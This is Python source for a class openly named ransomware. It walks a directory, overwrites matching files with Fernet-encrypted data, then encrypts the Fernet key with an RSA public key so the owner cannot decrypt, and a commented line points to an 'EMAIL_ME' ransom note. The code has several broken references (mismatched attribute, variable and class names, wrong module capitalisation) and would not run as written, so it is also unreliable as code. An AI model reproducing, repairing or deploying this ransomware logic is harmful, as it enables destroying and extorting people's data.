import os
from crypto.PublicKey import RSA
from crypto.Random import get_random_bytes
from crypto.Cipher import AES, PKCS1_OAEP
from Cryptography.fernet import Fernet
class ransomware:
    file = ['txt']

    def __init__(self):
        self.key = None
        self.crypter = None
        self.publickey = None
        self.localroot = r'C:\Users\Pratham\Documents\ransom\localroot'

    def generate_key(self):
        self.key = Fernet.generate_key()
        self.crypter = Fernet(self.key)

    def write_key(self):
        with open('fernet_key.txt', 'wb') as f:
            f.write(self.key)
    
    def encrypt_fernet_key(self):
        with open('fernet_key.txt','rb') as fk:
            fernet_key=fk.read()
        with open('fernet_key.txt', 'wb') as f:
             self.public_key = RSA.import_key(open('public.pem').read())
             public_crypter =  PKCS1_OAEP.new(self.public_key)
             enc_fernent_key = public_crypter.encrypt(fernet_key)
             f.write(enc_fernet_key)

        #with open(f'{self.sysRoot}Desktop/EMAIL_ME.txt', 'wb') as fa:
            #fa.write(enc_fernent_key)

        self.key = enc_fernent_key
        self.crypter = None

    def crypt_file(self, file_path, encrypted = False):
        with open(file_path, 'rb') as f:
            data = f.read()
            if not encrypted:
                print(data)
                _data = self.crypter.encrypt(data)
                print('> file encrypted')
                print(_data)
            else:
                _data = self.crypter.decrypt(data)
                print('> file decrypted')
                print(_data)
        with open(file_path, 'wb') as fp:
            fp.write(_data)
        
    def crypt_system(self, encrypted=False):
        system = os.walk(self.localRoot, topdown=True)
        for root, dir, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                if not file.split('.')[-1] in self.file_exts:
                    continue
                if not encrypted:
                    self.crypt_file(file_path)
                else:
                    self.crypt_file(file_path, encrypted=True)
            
def main():
    # testfile = r'D:\Coding\Python\RansomWare\RansomWare_Software\testfile.png'
    rw = RansomWare()
    rw.generate_key()
    rw.crypt_system()
    rw.write_key()
    rw.encrypt_fernet_key()

if __name__ == '__main__':
    main()


    
